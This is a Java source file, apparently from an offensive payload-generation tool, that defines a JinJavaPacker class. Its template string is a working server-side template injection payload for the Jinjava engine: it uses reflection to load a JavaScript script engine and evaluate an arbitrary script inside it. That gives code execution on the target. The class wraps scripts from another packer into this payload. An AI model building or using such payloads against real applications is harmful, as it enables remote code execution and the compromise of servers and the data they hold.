package com.reajason.javaweb.packer.jinjava;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.PackerMeta;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.packer.scriptengine.ScriptEnginePacker;
import org.kohsuke.MetaInfServices;

/**
 * @author ReaJason
 * @since 2025/1/30
 */
@MetaInfServices(Packer.class)
@PackerMeta(name = Packers.JinJava, order = 1900)
public class JinJavaPacker implements Packer {
    String template = "{{ ''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(''.getClass().forName('java.io.StringReader').getConstructors()[0].newInstance('{{script}}')) }}";

    @Override
    public String pack(ClassPackerConfig config) {
        String script = new ScriptEnginePacker().pack(config);
        return template.replace("{{script}}", script);
    }
}
